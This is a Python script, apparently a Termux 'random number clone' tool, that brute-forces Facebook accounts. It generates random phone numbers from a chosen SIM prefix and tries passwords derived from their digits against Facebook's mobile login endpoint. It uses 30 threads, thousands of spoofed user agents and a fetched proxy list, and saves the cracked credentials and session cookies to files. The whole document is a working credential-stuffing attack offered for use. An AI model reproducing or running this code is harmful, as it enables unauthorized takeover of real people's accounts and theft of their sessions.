import os,sys,time,json,random,re,string,platform,base64,uuid

from bs4 import BeautifulSoup as sop

from bs4 import BeautifulSoup

import requests as ress

from datetime import date

from datetime import datetime

from time import sleep

from os import system as s

from time import sleep as waktu

try:

    import requests

    from concurrent.futures import ThreadPoolExecutor as ThreadPool

    import mechanize

    from requests.exceptions import ConnectionError

except ModuleNotFoundError:

    os.system('pip install mechanize requests futures bs4==2 > /dev/null')

    os.system('pip install bs4')

    os.system('pkg install espeak')

RED = '\x1b[1;100m'

WHITE = '\033[1;97m'

GREEN = '\033[1;32m' 

YELLOW = '\033[1;33m'

BLUE = '\033[1;32m'

ORANGE = '\033[1;35m'

P = '\x1b[1;97m' 

M = '\x1b[1;91m' 

H = '\x1b[1;92m' 

K = '\x1b[1;93m' 

B = '\x1b[1;94m' 

U = '\x1b[1;95m' 

O = '\x1b[1;96m' 

N = '\x1b[0m'    

A = '\x1b[1;90m' 

BN = '\x1b[1;107m' 

BBL = '\x1b[1;106m' 

BP = '\x1b[1;105m' 

BB = '\x1b[1;104m' 

BK = '\x1b[1;103m' 

BH = '\x1b[1;102m' 

BM = '\x1b[1;101m' 

BA = '\x1b[1;100m' 

now = datetime.now()

dt_string = now.strftime("%H:%M")

current = datetime.now()

ta = current.year

bu = current.month

ha = current.day

today = date.today() 

loop = 0

oks = []

cps = []

ugen2=[]

ugen=[]

cokbrut=[]

ses=requests.Session()

princp=[]

try:

    pr= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
    open('.prox.txt','r').write(pr)
    prox=open('.prox.txt','r').read().splitlines()
except Exception as e:

 print('')



for xd in range(10000):

    aa='Mozilla/5.0 (Linux; Android 12;'

    b=random.choice(['6','7','8','9','10','11','12'])

    c='Galaxy Note 10 '

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.46 (KHTML, like Gecko) Chrome/'

    h=random.randrange(73,100)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l=' Chrome/112.0.5615.48 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)
    

    aa='Mozilla/5.0 (Linux; Android 13;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['Redmi Note 12 Pro'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/116.0.0.0 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

    
    

    aa='Mozilla/5.0 (Linux; Android 11'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['SM-A705FN Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) '

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/114.0.5735.196 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)
    
   

    aa='Mozilla/5.0 (Linux; Android 12'

    b=random.choice(['537.36','9','10','11','12'])

    c=random.choice(['CPH2477) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) '

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/101.0.4951.41 Mobile Safari/537.36'

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

	


    aa='Mozilla/5.0 (Linux; Android 13; '

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['V2246'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko)'

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/101.0.4951.41 Mobile Safari/537.36 '

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)



    aa='Mozilla/5.0 (Linux; Android 9.0;'

    b=random.choice(['7.0','8.1.0','9','10','11','12'])

    c=random.choice(['HUAWEI P30 PRO'])

    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    e=random.randrange(1, 999)

    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])

    g='AppleWebKit/537.36 (KHTML, like Gecko) '

    h=random.randrange(80,103)

    i='0'

    j=random.randrange(4200,4900)

    k=random.randrange(40,150)

    l='Chrome/39.0.0.0 Mobile Safari/537.36 '

    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'

    ugen.append(uaku2)

os.system('xdg-open https://www.facebook.com/profile.php?id=100045564883036')

logo = ("""\033[1;32m
███████ ██      ██ ████████ ███████   \033[1;34m𝐀\033[1;37m 
██      ██      ██    ██    ██        \033[1;31m 𝐊\033[1;37m
█████   ██      ██    ██    █████       \033[1;35m𝐀\033[1;37m 
██      ██      ██    ██    ██           \033[1;35m𝐒\033[1;37m
███████ ███████ ██    ██    ███████       \033[1;35m𝐇\033[1;37m 
\033[38;5;46m══════════════════════════════════════════════════
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐂𝐑𝐄𝐀𝐓𝐄𝐃 𝐁𝐘 : 𝐀𝐊𝐀𝐇 𝐃𝐀𝐒
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐅𝐀𝐂𝐄𝐁𝐎𝐊 : 𝐀𝐊𝐀𝐒𝐇 𝐃𝐀𝐒
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐆𝐈𝐓𝐇𝐔𝐁 : 𝐀𝐊𝐀𝐒𝐇 𝐃𝐀𝐒𝟒𝟎𝟒
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐓𝐎𝐎𝐋 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝐅𝐑𝐄𝐄
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐓𝐀𝐌𝐄 : 𝐄𝐋𝐈𝐓𝐄 🥀
\33[38;5;196m[>🌺<] 𝐀𝐊𝐀𝐒𝐇 [🍁] 𝐊𝐈𝐍𝐆[😈]\033[34;1m𝐓𝐎𝐎𝐋 𝐕𝐈𝐑𝐒𝐈𝐎𝐍 : 𝟏.𝟎              \033[1;32m
\033[38;5;46m══════════════════════════════════════════════════ """)                                         



class Main:

    def __init__(self):

        self.id = []

        self.ok = []

        self.cp = []

        self.loop = 0

        os.system("clear")

        print(logo)        

        print("[1] RANDOM NUMBER CLONE \033[1;32m")

        print("[2] MY fACEBOOK GROUP   \033[1;35m")
        
        print("[3] MY fACEBOOK ACCOUNT  \033[1;35m")

        print("[00] Exit")        

        Elite =input("[?] Choose :>> ")

        os.system('xdg-open https://facebook.com/groups/528058202631155/')

        if Elite in ["1", "01"]:

            num()

        if Elite in ["2","02"]:

            os.system('xdg-open https://www.facebook.com/profile.php?id=100045564883036')

        if Elite in [" 0", "00"]:

            exit()

        else:

            exit()

def num():

    user=[]

    os.system('clear')

    print(logo)

    print('[+] EXAMPLE : 017, 018, 019, 016, 013, 014 ')

    

    kode = input('[?] Enter sim code:>> ')

    kodex = ''.join(random.choice(string.digits) for _ in range(2))

    kod = ''.join(random.choice(string.digits) for _ in range(2))

    os.system('clear')

    print(logo)

    print('[+] EXAMPLE : 3000, 5000, 10000, 50000 ')

   

    limit = int(input('[?] Crack Your Limit :>> '))

    for nmbr in range(limit):

        nmp = ''.join(random.choice(string.digits) for _ in range(4))

        user.append(nmp)

    with ThreadPool(max_workers=30) as noob:

        os.system('clear')

        print(logo)     

        tl = str(len(user))

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        print(' \033[34;1m[+] Total ids:\033[1;92m '+tl)

        print(' \033[34;1m[+] Process has been started🐼')

        print(' \033[34;1m[+] Wait [🖕] for ids 🥰')

        print(' \033[34;1m[+] Use Flight [✈️] mode for speed up or ok ids')

        print("\033[1;32m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m═══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m══\x1b[1;91m══\033[1;32m══\033[1;31m══\x1b[1;94m══\x1b[1;96m═══")

        for guru in user:

            uid = kode+kodex+kod+guru

            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]

            noob.submit(rcrack1,uid,pwx,tl)

    print(' [+] Crack process has been completed')

    print(' [+] Ids saved in ok.txt,cp.txt')



def rcrack1(uid,pwx,tl):

    global loop

    global cps

    global oks

    global proxy

    try:

        for ps in pwx:

            pro = random.choice(ugen)

            session = requests.Session()

            sys.stdout.write('\r[\033[1;92m𝐀𝐊𝐀𝐒𝐇-X\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\x1b[1;100m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),

            sys.stdout.flush()

            free_fb = session.get('https://m.facebook.com').text

            log_data = {

                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),

            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),

            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),

            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),

            "try_number":"0",

            "unrecognized_tries":"0",

            "email":uid,

            "pass":ps,

            "login":"Log In"}

            header_freefb = {'authority': 'mbasic.facebook.com',

            'method':'POST',

            'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',

            'scheme':'https',

            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

            'accept-language': 'en-US,en;q=0.9',

            'cache-control': 'max-age=0',

            'referer': 'https://mbasic.facebook.com/',

            'sec-ch-ua': '"Chromium";v="111", "Not(A:Brand";v="8"',

            'sec-ch-ua-mobile': '?0',

            'sec-ch-ua-platform': '"Linux"',

            'sec-fetch-dest': 'document',

            'sec-fetch-mode': 'navigate',

            'sec-fetch-site': 'same-origin',

            'sec-fetch-user': '?1',

            'upgrade-insecure-requests': '1',

            'user-agent': pro }

            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text

            log_cookies=session.cookies.get_dict().keys()

            if 'c_user' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[7:22]

                print(f"\033[38;5;46m[𝐀𝐊𝐀𝐒𝐇-X-OK🌺] {cid} | {ps}")

                print(f" Cookie : {coki}")

                open('/sdcard/cp.txt', 'a').write( uid+' | '+ps+'\n')

                oks.append(uid)

                break

            elif 'checkpoint' in log_cookies:

                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])

                cid = coki[82:97]

                print(f"\x1b[38;5;196m[𝐀𝐊𝐀𝐒𝐇-X-CP🍒] {uid}|{ps}")

                open('/sdcard/ok.txt', 'a').write( uid+' | '+ps+' \n')

                cps.append(uid)

                break

            else:

                continue

        loop+=1

        sys.stdout.write(f'\r\033[m[𝐀𝐊𝐀𝐒𝐇-X🍒] \033[1;92m%s\033[mOK|\033[m[\033[mOK:\033[1;92m%s\033[mOK] '%(loop,len(oks))),

        sys.stdout.flush()

    except:

        pass

Main()